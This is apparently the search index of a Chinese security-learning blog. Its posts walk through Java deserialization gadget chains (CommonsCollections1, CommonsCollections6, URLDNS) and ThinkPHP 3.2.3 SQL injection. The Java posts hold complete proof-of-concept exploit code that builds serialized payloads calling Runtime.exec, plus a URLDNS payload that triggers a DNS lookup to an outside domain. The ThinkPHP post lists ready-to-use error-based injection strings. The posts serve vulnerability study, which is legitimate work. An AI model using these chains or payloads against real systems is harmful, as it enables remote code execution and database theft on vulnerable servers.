[{"categories":["Java"],"content":"世界上最好用的 CC 链 ","date":"2024-01-15","objectID":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections6链详解","uri":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections6 详解CommonsCollections1 的链子调用了LazyMap类中的transform()方法，于是找一个任意类调用get()方法的地方，这里换到了TideMapEntry类 这里的hashCode()方法里调用了getValue()方法里面调用了get()方法，并且map可控，这里的hashCode()很熟悉，因为在URLDNS链中HashMap类里的readObject()方法调用到了hashCode()方法 于是构造poc package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections6 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e lazymap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, \"test\"); HashMap\u003cObject, Object\u003e map2 = new HashMap\u003c\u003e(); map2.put(tiedMapEntry,\"test1\"); lazymap.remove(\"test\"); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazymap,chainedTransformer); //serialize(map2); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-15","objectID":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections6链详解","uri":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"N1Rvana's introduction","date":"2024-01-15","objectID":"/about/","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" About MeSU Team of member 某不知名三本院校大一在读 ","date":"2024-01-15","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" CVE-List CVE-ID Porject CVE-2022-2886 Laravel CVE-2022-2870 Laravel CVE-2022-33107 ThinkPHP ","date":"2024-01-15","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"N1Rvana's friends","date":"2024-01-15","objectID":"/friends/","tags":null,"title":"Index","uri":"/friends/"},{"categories":null,"content":" Base info - nickname: N1rvana avatar: https://nlrvana.github.io/avatar.png url: https://nlrvana.github.io/ 交换友链，请按上述格式发送至beichenghua@gmail.com ","date":"2024-01-15","objectID":"/friends/:1:0","tags":null,"title":"Index","uri":"/friends/"},{"categories":["PHP"],"content":"ThinkPHP 漏洞学习 环境搭建ThinkPHP3 composer create-project topthink/thinkphp=版本号 文件名 ThinkPHP5(完整版) composer create-project topthink/think=版本号 文件名 阿里云 Compose 全量镜像资源库 composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ https://www.runoob.com/w3cnote/composer-install-and-usage.html https://packagist.org/ 框架了解审计之前，我们需要了解框架的信息 ThinkPHP3.2.3完全开发手册 composer create-project topthink/thinkphp=3.2.3 thinkphp3.2.3 index.php 入口文件 Application 应用目录 Public 资源文件目录 ThinkPHP 框架目录 其中框架目录ThinkPHP的结构如下 Common 核心公共函数目录 Conf 核心配置目录 Lang 核心语言包目录 Library 核心类库目录 Think 核心Think类库目录 Behavior 行为类库目录 Org Org类库目录 Vendor 第三方类库目录 ... 更多类库目录 Mode 框架应用模式目录 Tpl 系统模板目录 ThinkPHP.php 框架入口文件 其中Application目录如下 Common 应用公共模块 Common 应用公共函数目录 Conf 应用公共配置文件目录 Home 默认生成的Home模块 Conf 模块配置文件目录 Common 模块函数公共目录 Controller 模块控制器目录 Model 模块模型目录 View 模块视图文件目录 Runtime 运行时目录 Cache 模板缓存目录 Data 数据目录 Logs 日志目录 Temp 缓存目录 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:0:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 路由信息thinkphp3使用 URL 模式切换：普通 GET 模式、pathinfo、rewrite 和兼容模式 /ThinkPHP/Conf/convention.php return array( \"URL_MODEL\" =\u003e 1 //URL模式:0(普通模式) 1(PATHINFO 模式) 2(REWRITE模式) 3(兼容模式) //静态路由 \"URL_ROUTE_ON\" =\u003e fasle, \"URL_ROUTE_RULES\" =\u003e array() ) 历史漏洞","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" SQL 注入","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 0x01 聚合查询功能count方法未过滤调用parseKey 利用条件ThinkPHP[5.0.0,5.0.23]，ThinkPHP 3 全版本 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:1","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 漏洞分析和原理ThinkPHP3.2.3 漏洞 demo public function SqlDemo(){ $field = I('get.field'); $num = M('user')-\u003ecount($field); //M('user') 相当于 new Think\\Model('user') var_dump($num); } poc ?field=id),updatexml(1,concat(1,user(),1),1)from+user%23 在这里打个断点，跟进 会进入到ThinkPHP/Library/Think/Model.class.php中的__call方法中， 因为是count，所以进入到$this-\u003egetField()方法 经过对传入字段进行解析等一系列操作之后， 进入到$this-\u003edb-\u003eselect()方法中 此时传入的$options变成了 继续跟进，这里进入到了$this-\u003ebuildSelectSql()方法，来构建 select 语句 进入到$this-\u003eparseSql()方法中 利用$this-\u003eparseField()方法进行解析，继续跟进 这里的$this-\u003eparseKey()对传入的 payload 并没有进行过滤 然后便回到$this-\u003eparseField()方法中，返回构建的 field 语句 最终回到$this-\u003eparseSql()方法中，返回最终需要执行的 sql 语句 最后得到了执行 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:2","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 0x02 _parseOptions未过滤$options导致 sql 注入 利用条件ThinkPHP \u003c= 3.2.3 漏洞原理和分析$options查询条件可以不经过数据处理直接进入_parseOptions，再进入Driver.class.php的sql操作函数，和上面一样通过buildSelectsql方法或直接调用delete方法进行拼接 sql 语句，然后再进行执行 漏洞 Demo public function SqlDemo() { $id = I('id'); $res = M('user')-\u003eselect($id); $res = M('user')-\u003efind($id); } poc id[comment]=\\*/where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)/\\* id[limit]=1,1+procdure+analyse(updatexml(1,concat(0x7e,user(),0x7e),1),1)-- id[field]=* from user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1) --+ 具体构造出多少个poc，可以看pasexxx有多少个 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:3","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["Java"],"content":"比较难一点的CC链 CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法 很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的 构造一个简单的 payload 试试 new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}).transform(Runtime.getRuntime()); `` 找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法 valueTransformer变量可控 但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用 再查看一下哪里调用了checkSetValue()方法，只有这一处 setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法 这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationhandleconstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationhandleconstructor.setAccessible(true); Object o = annotationInvocationhandleconstructor.newInstance(Target.class,transformedMap); 但是这里存在两个问题 第一个问题是Runtime没有实现Seriablable接口，无法参与序列化过程 利用反射来解决，这里再利用一个ChainedTransformer.transform方法 简单来说就是上一个执行transform方法返回的结果作为下一个执行transform方法输入 Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 还有一个问题，无法控制setValue()里面的参数值 这里利用org.apache.commons.collections.functors.ConstantTransformer的transform()方法，无论传入什么，都会返回固定的值 所以完善一下上面的poc Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 于是完整的poc如下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollection1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); InvokerTransformer invokerTransformer =new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); map.put(\"value\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } 整个调用栈如下 注 这里为什么要用Target Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); 因为Target中有值是value 这里的getKey()获取的就是，上面map.put()放入的key值 map.put(\"value\",\"value\"); key放入value，正好能取出Target中的值，所以就绕过了if条件 ","date":"2024-01-14","objectID":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 另一条在上面选择任意类执行transform方法的时候，选择了TransformedMap 这次选择另一个类LazyMap中的get()方法 再看一下哪里调用了get()方法，恰好在AnnotationInocationHandler类中的inoke()方法中调用了get()方法 而恰好memberValues也是可控的，那如何调用到invoke()方法呢？ 这里需要一个新的知识点，动态代理，将AnnoationInvocationHandler动态代理，执行任意方法，即可调用到invoke方法，但是根据 invoke 中的if条件，执行的任意方法必须是无参的，恰好在AnnotationInvocationHandler类中的readObject()方法中，有这样的方法存在 于是根据上面的poc修改一下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-14","objectID":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":"世界上最简单的 java 链 先来看一下如何序列化/反序列化 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user.setName(\"xiaoming\"); //序列化输出 ObjectOutputStream out = new ObjectOutputStream(System.out); out.writeObject(user); System.out.println(); // 序列化写入文件 FileOutputStream file = new FileOutputStream(\"test.bin\"); ObjectOutputStream fout = new ObjectOutputStream(file); fout.writeObject(user); // 序列化写入到变量中 ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream jout = new ObjectOutputStream(bout); jout.writeObject(user); byte[] str = bout.toByteArray(); System.out.println(new String(str)); // 从变量中反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str)); user user_d = (user) ois.readObject(); System.out.println(user_d.getName()); } } class user implements Serializable{ private String name; public user() { } public void setName(String name) { this.name = name; } public String getName() { return name; } } URLDNS链详解","date":"2024-01-14","objectID":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["URLDNS"],"title":"URLDNS链详解","uri":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 原理java.util.HashMap重写了readObject方法，在反序列化时调用hash函数计算 key 的 hashCode，而java.net.URL的 hashCode 在计算时会调用getHostAddress来解析域名，从而发出 DNS 请求 由HashMap 类readObject引起， private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { reinitialize(); ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\"loadFactor\", 0.75f); if (lf \u003c= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\"Illegal load factor: \" + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u003c 0) { throw new InvalidObjectException(\"Illegal mappings count: \" + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u003e 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u003c DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u003e= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u003c MAXIMUM_CAPACITY \u0026\u0026 ft \u003c MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\"rawtypes\",\"unchecked\"}) Node\u003cK,V\u003e[] tab = (Node\u003cK,V\u003e[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u003c mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 在HashMap的键名计算了 hash， putVal(hash(key), key, value, false, false); 跟进查看一下 调用了key.hashCode()，而这里的 key 是可控的，就是传入的java.net.URL，跟进查看一下 这里hashCode==-1，重新进行hashCode()方法计算，跟进handler查看调用了哪一个hashCode() transient关键字，修饰 Java 序列化对象时，不需要序列化属性也就是handler属性不参与序列化，直接跟进URLStreamHandler查看一下 这里调用了getHostAddress跟进查看一下 又调用了java.net.URL的getHostAddress方法 继续跟进 进入到InetAddress.getByName(host);便会触发DNS请求 继续回到readObject()中，看看如何给key赋值 key是从K key = (K) s.readObject();这串代码，也就是readObject中得到的，说明之前是writeObject会写入 key HashMap#writeObject 进入了internalWriteEntries()跟进查看 这里的key以及value是从 tab 中取的，而 tab 的值即HashMap中 table 的值。 想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以这里也会产生一次dns查询 为了避免这次 dns 查询，我们将hashCode设置不为-1的其他值 构造完整poc package org.example; import java.io.*; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static void main(String[] args) throws Exception { HashMap hashmap = new HashMap(); URL url = new URL(\"http://47894df839.ipv6.1433.eu.org\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url,1); hashmap.put(url,1); f.set(url,-1); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(hashmap); byte[] str = b.toByteArray(); System.out.println(str); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str)); ois.readObject(); } } 调用栈如下 ","date":"2024-01-14","objectID":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["URLDNS"],"title":"URLDNS链详解","uri":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/"}]